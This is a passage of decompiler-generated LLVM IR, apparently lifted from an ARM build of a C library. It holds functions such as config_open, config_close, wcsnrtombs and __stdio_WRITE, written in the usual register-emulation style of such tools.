  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 33, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 131072, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_15b98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b80, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15b60, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b14, { 1, 0 }
  uselistorder label %dec_label_pc_158e4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15a8c, { 1, 0 }
  uselistorder label %dec_label_pc_15a4c, { 1, 0 }
  uselistorder label %dec_label_pc_15a40, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15a04, { 1, 0 }
  uselistorder label %dec_label_pc_15938, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15bac = icmp eq i32* %arg1, null
  br i1 %v2_15bac, label %dec_label_pc_15bd4, label %dec_label_pc_15bb4

dec_label_pc_15bb4:                               ; preds = %entry
  %v2_15bb4 = load i32, i32* %arg1, align 4
  %v1_15bb8 = inttoptr i32 %v2_15bb4 to i16*
  %v2_15bb8 = call i32 @__GI_fclose(i16* %v1_15bb8)
  %v0_15bbc = load i32, i32* @r4, align 4
  %v1_15bbc = add i32 %v0_15bbc, 20
  %v2_15bbc = inttoptr i32 %v1_15bbc to i32*
  %v3_15bbc = load i32, i32* %v2_15bbc, align 4
  %v2_15bc0 = icmp eq i32 %v3_15bbc, 0
  br i1 %v2_15bc0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15bb4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15bb4, %bb
  store i32 89036, i32* @lr, align 4
  %v1_15bc8 = xor i1 %v2_15bc0, true
  call void @__pseudo_cond_branch(i1 %v1_15bc8, i32 ptrtoint (i32* @global_var_1375c.598 to i32))
  %v0_15bcc = load i32, i32* @r4, align 4
  store i32 %v0_15bcc, i32* @r0, align 4
  %v0_15bd0 = call i32 @free()
  br label %dec_label_pc_15bd4

dec_label_pc_15bd4:                               ; preds = %entry, %bb6
  %v1_15bd8 = phi i32 [ 0, %entry ], [ %v0_15bd0, %bb6 ]
  ret i32 %v1_15bd8

; uselistorder directives
  uselistorder label %dec_label_pc_15bd4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15be8 = load i32, i32* @r4, align 4
  store i32 %v3_15be8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33888), i32* @r1, align 4
  %v0_15bf0 = load i32, i32* @r0, align 4
  %v2_15bf0 = call i32 @__GI_fopen(i32 %v0_15bf0, i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33888))
  store i32 %v2_15bf0, i32* %r0.global-to-local, align 4
  store i32 %v2_15bf0, i32* @r4, align 4
  %v2_15bf4 = icmp eq i32 %v2_15bf0, 0
  br i1 %v2_15bf4, label %bb, label %dec_label_pc_15c00

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15c00:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15c08 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15c08, i32* %r0.global-to-local, align 4
  %v2_15c0c = icmp eq i32 %v2_15c08, 0
  br i1 %v2_15c0c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15c00
  %v1_15c10 = load i32, i32* @r4, align 4
  %v3_15c10 = inttoptr i32 %v2_15c08 to i32*
  store i32 %v1_15c10, i32* %v3_15c10, align 4
  %v1_15c18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15c00, %bb4
  %v1_15c18 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15c00 ], [ %v1_15c18.pre, %bb4 ]
  %v2_15c14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15c14, i32* @r4, align 4
  ret i32 %v1_15c18

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33888), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_15c24 = load i32, i32* @lr, align 4
  %v2_15c28 = icmp eq i32 %arg1, 0
  br i1 %v2_15c28, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_15c30 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_15c58 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_15c44 = phi i32 [ %arg1, %.thread ], [ %v3_15c30, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_15c40 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_15c40, i32* @ip, align 4
  %v2_15c48 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_15c40, i32* %stack_var_-16, align 4
  store i32 %v0_15c58, i32* %stack_var_-12, align 4
  %v5_15c60 = inttoptr i32 %v0_15c44 to i8*
  %v6_15c60 = call i32 @__GI_wcsnrtombs(i8* %v5_15c60, i32 %v2_15c48, i32 1, i32 16, i32 %arg3)
  %v2_15c64 = icmp eq i32 %v6_15c60, 0
  br i1 %v2_15c64, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_15c74 = phi i32 [ %v6_15c60, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_15c24, i32* @lr, align 4
  ret i32 %v1_15c74

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_15c8c = load i32, i32* @r0, align 4
  %v1_15c8c = load i32, i32* @r1, align 4
  %v5_15c8c = inttoptr i32 %v0_15c8c to i8*
  %v6_15c8c = call i32 @__GI_wcsnrtombs(i8* %v5_15c8c, i32 %v1_15c8c, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_15c8c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15c9c = load i32, i32* @r4, align 4
  store i32 %v3_15c9c, i32* %stack_var_-12, align 4
  %v10_15ca0 = icmp eq i32 %tmp, %arg2
  store i1 %v10_15ca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_15ca0, label %dec_label_pc_15cb8, label %bb

bb:                                               ; preds = %entry
  %v4_15ca4 = icmp eq i8* %arg1, null
  store i1 %v4_15ca4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_15ca4, label %dec_label_pc_15cb8.thread, label %bb39

dec_label_pc_15cb8.thread:                        ; preds = %bb
  %v2_15ca8 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_15cb8:                               ; preds = %entry
  %v2_15ca81 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_15cb8 = icmp eq i8* %arg1, null
  store i1 %v3_15cb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15cb8, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15cb8
  store i32 %v2_15ca81, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_15cb8, %dec_label_pc_15cb8.thread
  %storemerge20 = phi i32 [ %v2_15ca81, %dec_label_pc_15cb8 ], [ %v2_15ca8, %dec_label_pc_15cb8.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_15d1428 = phi i32 [ %v2_15ca81, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_15cd0 = load i32, i32* @r3, align 4
  %v3_15cd0 = icmp uge i32 %v0_15cd0, %arg3
  %arg3.v0_15cd0 = select i1 %v3_15cd0, i32 %arg3, i32 %v0_15cd0
  store i32 %arg3.v0_15cd0, i32* %r5.global-to-local, align 4
  %v1_15cdc = inttoptr i32 %arg2 to i32*
  %v2_15cdc = load i32, i32* %v1_15cdc, align 4
  store i32 %v2_15cdc, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_15cd0, i32* %r0.global-to-local, align 4
  %v2_15d2822 = icmp eq i32 %arg3.v0_15cd0, 0
  store i1 %v2_15d2822, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d2822, label %dec_label_pc_15d30, label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %.thread14.thread, %dec_label_pc_15d20.dec_label_pc_15ce8_crit_edge
  %v2_15d14 = phi i32 [ %v2_15d20, %dec_label_pc_15d20.dec_label_pc_15ce8_crit_edge ], [ %v2_15d1428, %.thread14.thread ]
  %v0_15cf4 = phi i32 [ %v0_15ce8.pre, %dec_label_pc_15d20.dec_label_pc_15ce8_crit_edge ], [ %v2_15cdc, %.thread14.thread ]
  %v1_15ce8 = inttoptr i32 %v0_15cf4 to i32*
  %v2_15ce8 = load i32, i32* %v1_15ce8, align 4
  %v7_15cec = icmp eq i32 %v2_15ce8, 127
  store i1 %v7_15cec, i1* %cpsr_z.global-to-local, align 1
  %v1_15cf0 = urem i32 %v2_15ce8, 256
  store i32 %v1_15cf0, i32* @ip, align 4
  %v1_15cf4 = add i32 %v0_15cf4, 4
  store i32 %v1_15cf4, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_15ce8, 128
  br i1 %tmp45, label %dec_label_pc_15d10, label %dec_label_pc_15cfc

dec_label_pc_15cfc:                               ; preds = %dec_label_pc_15ce8
  %v0_15cfc = call i32 @__GI___errno_location()
  store i32 %v0_15cfc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15d08 = inttoptr i32 %v0_15cfc to i32*
  store i32 84, i32* %v2_15d08, align 4
  %v0_15d3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d3c

dec_label_pc_15d10:                               ; preds = %dec_label_pc_15ce8
  %v2_15d10 = icmp eq i32 %v1_15cf0, 0
  store i1 %v2_15d10, i1* %cpsr_z.global-to-local, align 1
  %v1_15d14 = trunc i32 %v2_15ce8 to i8
  %v3_15d14 = inttoptr i32 %v2_15d14 to i8*
  store i8 %v1_15d14, i8* %v3_15d14, align 1
  %v0_15d18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15d18, label %.dec_label_pc_15d30_crit_edge, label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d10
  %v0_15d20 = load i32, i32* %lr.global-to-local, align 4
  %v1_15d20 = load i32, i32* %r4.global-to-local, align 4
  %v2_15d20 = add i32 %v1_15d20, %v0_15d20
  store i32 %v2_15d20, i32* %lr.global-to-local, align 4
  %v0_15d24 = load i32, i32* %r0.global-to-local, align 4
  %v1_15d24 = add i32 %v0_15d24, -1
  store i32 %v1_15d24, i32* %r0.global-to-local, align 4
  %v2_15d28 = icmp eq i32 %v1_15d24, 0
  store i1 %v2_15d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d28, label %dec_label_pc_15d30, label %dec_label_pc_15d20.dec_label_pc_15ce8_crit_edge

dec_label_pc_15d20.dec_label_pc_15ce8_crit_edge:  ; preds = %dec_label_pc_15d20
  %v0_15ce8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15ce8

.dec_label_pc_15d30_crit_edge:                    ; preds = %dec_label_pc_15d10
  %v1_15d18 = load i32, i32* @ip, align 4
  store i32 %v1_15d18, i32* %r2.global-to-local, align 4
  %v0_15d30.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_15d30

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d20, %.dec_label_pc_15d30_crit_edge, %.thread14.thread
  %v0_15d30 = phi i32 [ %v0_15d30.pre, %.dec_label_pc_15d30_crit_edge ], [ %v2_15d1428, %.thread14.thread ], [ %v2_15d20, %dec_label_pc_15d20 ]
  %v1_15d30 = load i32, i32* @sp, align 4
  %v9_15d30 = icmp eq i32 %v0_15d30, %v1_15d30
  store i1 %v9_15d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d30, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_15d30
  %v1_15d34 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15d34, i32* %v1_15cdc, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_15d30, %bb43
  %v0_15d38 = load i32, i32* %r0.global-to-local, align 4
  %v1_15d38 = load i32, i32* %r5.global-to-local, align 4
  %v2_15d38 = sub i32 %v1_15d38, %v0_15d38
  store i32 %v2_15d38, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15cfc, %bb44
  %v0_15d3c = phi i32 [ %v0_15d3c.pre, %dec_label_pc_15cfc ], [ %v2_15d38, %bb44 ]
  store i32 %v0_15d3c, i32* %r0.global-to-local, align 4
  %v2_15d44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15d44, i32* %r4.global-to-local, align 4
  ret i32 %v0_15d3c

; uselistorder directives
  uselistorder i32 %v0_15d3c, { 1, 0 }
  uselistorder i32 %v1_15d24, { 1, 0 }
  uselistorder i32 %v2_15d20, { 0, 2, 1 }
  uselistorder i32 %v1_15cf0, { 1, 0 }
  uselistorder i32 %v2_15ce8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15d1428, { 1, 0 }
  uselistorder i32 %v2_15ca81, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 3, 5, 1, 6, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32 127, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d3c, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_15d30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ce8, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15d4c = load i32, i32* @r4, align 4
  store i32 %v3_15d4c, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_15d642 = icmp eq i32 %arg3, 0
  store i1 %v2_15d642, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d642, label %dec_label_pc_15df4, label %dec_label_pc_15d6c

dec_label_pc_15d64thread-pre-split:               ; preds = %dec_label_pc_15d6c
  %v3_15d84 = load i32, i32* %r6.global-to-local, align 4
  %v5_15d84 = add i32 %v3_15d84, %v3_15d7c
  store i32 %v5_15d84, i32* %r6.global-to-local, align 4
  %v4_15d88 = load i32, i32* %r5.global-to-local, align 4
  %v5_15d88 = sub i32 %v4_15d88, %v3_15d7c
  store i32 %v5_15d88, i32* %r5.global-to-local, align 4
  %v2_15d64 = icmp eq i32 %v5_15d88, 0
  store i1 %v2_15d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d64, label %dec_label_pc_15d64.dec_label_pc_15df4.loopexit_crit_edge, label %dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge

dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge: ; preds = %dec_label_pc_15d64thread-pre-split
  %v3_15d6c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15d78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15d6c

dec_label_pc_15d6c:                               ; preds = %entry, %dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge
  %v0_15d78 = phi i32 [ %v0_15d78.pre, %dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge ], [ %tmp, %entry ]
  %v0_15d74 = phi i32 [ %v5_15d84, %dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge ], [ %arg2, %entry ]
  %v3_15d6c = phi i32 [ %v3_15d6c.pre, %dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge ], [ 2147483647, %entry ]
  %v0_15d70.in = phi i32 [ %v5_15d88, %dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge ], [ %arg3, %entry ]
  %v3_15d70 = phi i32 [ %v5_15d88, %dec_label_pc_15d64thread-pre-split.dec_label_pc_15d6c_crit_edge ], [ %arg3, %entry ]
  %v0_15d70 = icmp slt i32 %v0_15d70.in, 0
  %storemerge = select i1 %v0_15d70, i32 %v3_15d6c, i32 %v3_15d70
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_15d74, i32* %r1.global-to-local, align 4
  %v1_15d78 = add i32 %v0_15d78, 4
  %v2_15d78 = inttoptr i32 %v1_15d78 to i32*
  %v3_15d78 = load i32, i32* %v2_15d78, align 4
  %v3_15d7c = call i32 @__GI_write(i32 %v3_15d78, i32 %v0_15d74)
  %v1_15d80 = icmp slt i32 %v3_15d7c, 0
  %v2_15d80 = icmp eq i32 %v3_15d7c, 0
  store i1 %v2_15d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15d80, label %dec_label_pc_15d90, label %dec_label_pc_15d64thread-pre-split

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d6c
  %v0_15d90 = load i32, i32* %r4.global-to-local, align 4
  %v1_15d90 = inttoptr i32 %v0_15d90 to i16*
  %v2_15d90 = load i16, i16* %v1_15d90, align 2
  %v3_15d90 = zext i16 %v2_15d90 to i32
  store i32 %v3_15d90, i32* %r3.global-to-local, align 4
  %v1_15d94 = add i32 %v0_15d90, 8
  store i32 %v1_15d94, i32* %r1.global-to-local, align 4
  %v1_15d98 = inttoptr i32 %v1_15d94 to i32*
  %v2_15d98 = load i32, i32* %v1_15d98, align 4
  store i32 %v2_15d98, i32* %r1.global-to-local, align 4
  %v3_15d98 = add i32 %v0_15d90, 12
  %v4_15d98 = inttoptr i32 %v3_15d98 to i32*
  %v5_15d98 = load i32, i32* %v4_15d98, align 4
  %v1_15d9c = or i32 %v3_15d90, 8
  store i32 %v1_15d9c, i32* %r3.global-to-local, align 4
  %v2_15da0 = sub i32 %v5_15d98, %v2_15d98
  store i32 %v2_15da0, i32* %r2.global-to-local, align 4
  %v9_15da0 = icmp eq i32 %v5_15d98, %v2_15d98
  store i1 %v9_15da0, i1* %cpsr_z.global-to-local, align 1
  %v1_15da4 = trunc i32 %v1_15d9c to i16
  store i16 %v1_15da4, i16* %v1_15d90, align 2
  br i1 %v9_15da0, label %dec_label_pc_15d90.dec_label_pc_15df0_crit_edge, label %dec_label_pc_15dac

dec_label_pc_15d90.dec_label_pc_15df0_crit_edge:  ; preds = %dec_label_pc_15d90
  %v0_15df0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15df0

dec_label_pc_15dac:                               ; preds = %dec_label_pc_15d90
  %v0_15dac = load i32, i32* %r2.global-to-local, align 4
  %v1_15dac = load i32, i32* %r5.global-to-local, align 4
  %v3_15dac = icmp ult i32 %v0_15dac, %v1_15dac
  %v9_15dac = icmp eq i32 %v0_15dac, %v1_15dac
  store i1 %v9_15dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15dac, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_15dac
  store i32 %v1_15dac, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_15dac, %bb23
  %v2_15dc0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_15dd4
  %v2_15dc0 = phi i32 [ %v2_15dc0.pre, %.preheader ], [ %v1_15dd8, %dec_label_pc_15dd4 ]
  %v0_15db4 = load i32, i32* %r6.global-to-local, align 4
  %v1_15db4 = inttoptr i32 %v0_15db4 to i8*
  %v2_15db4 = load i8, i8* %v1_15db4, align 1
  %v3_15db4 = zext i8 %v2_15db4 to i32
  store i32 %v3_15db4, i32* %r3.global-to-local, align 4
  %v7_15db8 = icmp eq i8 %v2_15db4, 10
  store i1 %v7_15db8, i1* %cpsr_z.global-to-local, align 1
  %v1_15dbc = add i32 %v0_15db4, 1
  store i32 %v1_15dbc, i32* %r6.global-to-local, align 4
  %v3_15dc0 = inttoptr i32 %v2_15dc0 to i8*
  store i8 %v2_15db4, i8* %v3_15dc0, align 1
  %v0_15dc4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15dc4, label %dec_label_pc_15dc8, label %dec_label_pc_15dd4

dec_label_pc_15dc8:                               ; preds = %bb24
  %v0_15dc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15dc8 = inttoptr i32 %v0_15dc8 to i16*
  %v2_15dc8 = load i16, i16* %v1_15dc8, align 2
  %v3_15dc8 = zext i16 %v2_15dc8 to i32
  store i32 %v3_15dc8, i32* %r3.global-to-local, align 4
  %v1_15dcc = and i32 %v3_15dc8, 256
  %v2_15dcc = icmp eq i32 %v1_15dcc, 0
  store i1 %v2_15dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15dcc, label %dec_label_pc_15dd4, label %dec_label_pc_15dc8.dec_label_pc_15de0_crit_edge

dec_label_pc_15dc8.dec_label_pc_15de0_crit_edge:  ; preds = %dec_label_pc_15dc8
  %v0_15de4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15de0

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dc8, %bb24
  %v0_15dd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15dd4 = add i32 %v0_15dd4, -1
  store i32 %v1_15dd4, i32* %r2.global-to-local, align 4
  %v7_15dd4 = icmp eq i32 %v0_15dd4, 1
  store i1 %v7_15dd4, i1* %cpsr_z.global-to-local, align 1
  %v0_15dd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15dd8 = add i32 %v0_15dd8, 1
  store i32 %v1_15dd8, i32* %r1.global-to-local, align 4
  br i1 %v7_15dd4, label %dec_label_pc_15dd4.dec_label_pc_15de0_crit_edge, label %bb24

dec_label_pc_15dd4.dec_label_pc_15de0_crit_edge:  ; preds = %dec_label_pc_15dd4
  %v0_15de0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15de0

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15dc8.dec_label_pc_15de0_crit_edge, %dec_label_pc_15dd4.dec_label_pc_15de0_crit_edge
  %v0_15de4 = phi i32 [ %v1_15dd8, %dec_label_pc_15dd4.dec_label_pc_15de0_crit_edge ], [ %v0_15de4.pre, %dec_label_pc_15dc8.dec_label_pc_15de0_crit_edge ]
  %v0_15de0 = phi i32 [ %v0_15de0.pre, %dec_label_pc_15dd4.dec_label_pc_15de0_crit_edge ], [ %v0_15dc8, %dec_label_pc_15dc8.dec_label_pc_15de0_crit_edge ]
  %v1_15de0 = add i32 %v0_15de0, 8
  %v2_15de0 = inttoptr i32 %v1_15de0 to i32*
  %v3_15de0 = load i32, i32* %v2_15de0, align 4
  store i32 %v3_15de0, i32* %r3.global-to-local, align 4
  %v2_15de4 = add i32 %v0_15de0, 16
  %v3_15de4 = inttoptr i32 %v2_15de4 to i32*
  store i32 %v0_15de4, i32* %v3_15de4, align 4
  %v0_15de8 = load i32, i32* %r3.global-to-local, align 4
  %v1_15de8 = load i32, i32* %r1.global-to-local, align 4
  %v2_15de8 = sub i32 %v1_15de8, %v0_15de8
  store i32 %v2_15de8, i32* %r3.global-to-local, align 4
  %v1_15dec = load i32, i32* %r5.global-to-local, align 4
  %v2_15dec = sub i32 %v1_15dec, %v2_15de8
  store i32 %v2_15dec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15df0

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15d90.dec_label_pc_15df0_crit_edge, %dec_label_pc_15de0
  %v0_15df0 = phi i32 [ %v0_15df0.pre, %dec_label_pc_15d90.dec_label_pc_15df0_crit_edge ], [ %v2_15dec, %dec_label_pc_15de0 ]
  %v1_15df0 = load i32, i32* @r7, align 4
  %v2_15df0 = sub i32 %v1_15df0, %v0_15df0
  br label %dec_label_pc_15df4

dec_label_pc_15d64.dec_label_pc_15df4.loopexit_crit_edge: ; preds = %dec_label_pc_15d64thread-pre-split
  %v0_15df4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15df4

dec_label_pc_15df4:                               ; preds = %entry, %dec_label_pc_15d64.dec_label_pc_15df4.loopexit_crit_edge, %dec_label_pc_15df0
  %v0_15df4 = phi i32 [ %v2_15df0, %dec_label_pc_15df0 ], [ %v0_15df4.pre.pre, %dec_label_pc_15d64.dec_label_pc_15df4.loopexit_crit_edge ], [ 0, %entry ]
  %v2_15df8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15df8, i32* %r4.global-to-local, align 4
  ret i32 %v0_15df4

; uselistorder directives
  uselistorder i32 %v0_15de0, { 1, 0 }
  uselistorder i32 %v1_15dd8, { 0, 2, 1 }
  uselistorder i32 %v0_15dd4, { 1, 0 }
  uselistorder i32 %v1_15dac, { 0, 2, 1 }
  uselistorder i32 %v0_15dac, { 1, 0 }
  uselistorder i32 %v5_15d98, { 1, 0 }
  uselistorder i32 %v2_15d98, { 1, 0, 2 }
  uselistorder i32 %v3_15d7c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15d74, { 1, 0 }
  uselistorder i32 %v5_15d88, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 4, 5, 2, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 2, 0 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15df4, { 1, 2, 0 }
